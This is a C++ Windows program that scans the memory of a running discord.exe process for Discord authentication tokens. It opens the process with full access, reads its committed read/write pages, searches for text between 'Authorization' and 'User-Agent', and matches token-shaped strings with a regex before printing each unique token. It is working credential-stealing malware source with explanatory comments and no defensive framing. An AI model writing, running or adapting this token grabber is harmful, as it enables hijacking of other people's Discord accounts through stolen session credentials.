#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include <string_view>
#include <regex>
#include <set>
#include <span>
#include <algorithm>

uint32_t GetProcessId(std::wstring_view ProcessName) {
    PROCESSENTRY32W Entry{ sizeof(PROCESSENTRY32W) };
    const auto Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    while (Process32NextW(Snapshot, &Entry)) {
        if (_wcsicmp(Entry.szExeFile, ProcessName.data()) == 0) {
            CloseHandle(Snapshot);
            return Entry.th32ProcessID;
        }
    }

    CloseHandle(Snapshot);
    return 0;
}

int main() {
    const uint32_t ProcessId = GetProcessId(L"discord.exe");
    
    const auto ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION, FALSE, ProcessId);
    if (!ProcessId || !ProcessHandle) return 1;

    const auto TokenPattern = std::regex(R"([A-Za-z0-9_-]{20,40}\.[A-Za-z0-9_-]{5,10}\.[A-Za-z0-9_-]{20,40})", std::regex_constants::optimize); // PARTS OF A DISCORD TOKEN // 1: User ID // 2: Timestamp // 3: Random chars
    std::set<std::string> UniqueTokens;
    
    SYSTEM_INFO SysInfo;
    GetSystemInfo(&SysInfo);

    std::vector<uint8_t> Buffer(1024 * 1024);

    auto CurrentAddr = reinterpret_cast<uint8_t*>(SysInfo.lpMinimumApplicationAddress);
    const auto MaxAddr = reinterpret_cast<uint8_t*>(SysInfo.lpMaximumApplicationAddress);

    while (CurrentAddr < MaxAddr) {
        MEMORY_BASIC_INFORMATION Mbi{};
        if (!VirtualQueryEx(ProcessHandle, CurrentAddr, &Mbi, sizeof(Mbi))) break;

        CurrentAddr += Mbi.RegionSize;
        if (Mbi.State != MEM_COMMIT || Mbi.Protect != PAGE_READWRITE) continue; // The details of the request sent is located inside a page with read/write protections, so this should narrow it down

        const size_t ReadSize = std::min<size_t>(Mbi.RegionSize, Buffer.size());
        if (!ReadProcessMemory(ProcessHandle, Mbi.BaseAddress, Buffer.data(), ReadSize, nullptr)) continue;

        std::string_view Content(reinterpret_cast<char*>(Buffer.data()), ReadSize);
        size_t Pos = 0;

        while ((Pos = Content.find("Authorization", Pos)) != std::string_view::npos) { // Finds the string between "Authorization", and "User-Agent" which will hold the token, since in the request the token is under the "Authorization" header
            auto End = Content.find("User-Agent", Pos);
            if (End == std::string_view::npos) { Pos++; continue; }

            std::string Section(Content.substr(Pos, End - Pos));
            std::smatch Match;

            if (std::regex_search(Section, Match, TokenPattern) && UniqueTokens.insert(Match[0]).second) // Only get tokens that are different, incase the user logs into a new account, or there are multiple of the same token found in the memory
                std::cout << Match[0] << '\n';

            Pos += 13;
        }
    }

    CloseHandle(ProcessHandle);
    std::cin.get();

    return 0;
}
